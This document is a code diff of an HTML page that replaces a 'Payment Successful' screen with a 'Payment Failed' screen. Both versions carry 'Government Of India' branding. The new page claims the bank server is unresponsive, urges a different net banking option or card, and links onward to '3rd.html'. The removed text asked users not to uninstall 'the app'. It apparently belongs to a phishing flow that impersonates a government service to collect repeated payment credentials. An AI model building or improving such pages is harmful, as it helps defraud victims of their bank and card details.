@@ -3,114 +3,127 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Payment Successful</title>
+  <title>Payment Failed</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #ffffff;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff5f5;
+      color: #333;
       text-align: center;
-      padding: 0 16px;
+      padding: 20px;
     }
 
-    .top-image-box {
-      margin-top: 40px;
-      margin-bottom: 20px;
+    .container {
+      max-width: 500px;
+      margin: 40px auto;
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 30px 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
     }
 
-    .top-image-box img {
-      width: 100px;
-      height: auto;
-      margin-bottom: 10px;
+    .warning-icon {
+      font-size: 60px;
+      color: #d00000;
+      margin-bottom: 15px;
     }
 
-    .top-image-box p {
-      font-size: 12px;
-      color: #555;
+    .gov-logo img {
+      width: 90px;
+      margin-bottom: 8px;
+    }
+
+    .gov-logo p {
+      font-size: 13px;
+      color: #777;
       margin-top: 0;
     }
 
-    h2 {
+    h1 {
       font-size: 20px;
-      color: #111;
-      font-weight: bold;
+      color: #d00000;
       margin: 20px 0 10px;
     }
 
-    hr {
-      border: none;
-      border-top: 1px solid #ccc;
-      margin: 20px 0;
+    .message {
+      font-size: 15px;
+      margin: 10px 0 30px;
+      color: #555;
+      line-height: 1.6;
     }
 
-    .note {
-      text-align: left;
-      font-size: 14px;
-      color: #333;
-      max-width: 500px;
-      margin: 0 auto 30px;
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
     }
 
-    .note strong {
-      display: block;
-      font-size: 16px;
-      color: #1976d2;
-      margin-bottom: 10px;
-    }
-
-    .exit-btn {
-      background-color: #d00000;
-      color: white;
+    .btn {
+      padding: 12px;
       font-size: 16px;
       font-weight: bold;
-      padding: 14px 40px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
-      margin-bottom: 40px;
     }
 
-    .exit-btn:hover {
-      background-color: #b00000;
+    .retry {
+      background-color: #007bff;
+      color: white;
+    }
+
+    .retry:hover {
+      background-color: #005fc1;
+    }
+
+    .exit {
+      background-color: #d00000;
+      color: white;
+    }
+
+    .exit:hover {
+      background-color: #a80000;
     }
 
     @media (max-width: 480px) {
-      .note {
-        font-size: 13px;
+      .container {
+        padding: 20px 15px;
       }
 
-      .exit-btn {
-        width: 100%;
+      h1 {
+        font-size: 18px;
+      }
+
+      .message {
+        font-size: 14px;
+      }
+
+      .btn {
+        font-size: 15px;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- Top G Emb -->
-  <div class="top-image-box">
-    <img src="go.jpg" alt="Go" />
-    <p>Government Of India</p>
+  <div class="container">
+    
+   
+
+    <div class="warning-icon">⚠️</div>
+
+    <h1>Payment Failed</h1>
+    <div class="message">
+      Your payment could not be completed because your bank server is currently unresponsive.<br>
+      Please try using a different net banking option or card.
+    </div>
+
+    <div class="buttons">
+      <button class="btn retry" onclick="window.location.href='3rd.html'">TRY AGAIN</button>
+      
+    </div>
   </div>
-
-  <!-- Main Heading -->
-  <h2>Payment Successful</h2>
-  <hr />
-
-  <!-- Important Note Section -->
-  <div class="note">
-    <strong>Important Note:</strong>
-    Please be patient as we verify your details. This process may take a minimum of 24 hours. You will receive a notification once your details are successfully verified. We appreciate your patience and kindly request that you do not uninstall the app, as it may prevent you from receiving notifications.<br><br>
-    Thank you.
-  </div>
-
-  <!-- Exit Button -->
-  <button class="exit-btn" onclick="window.close()">EXIT</button>
 
 </body>
 </html>
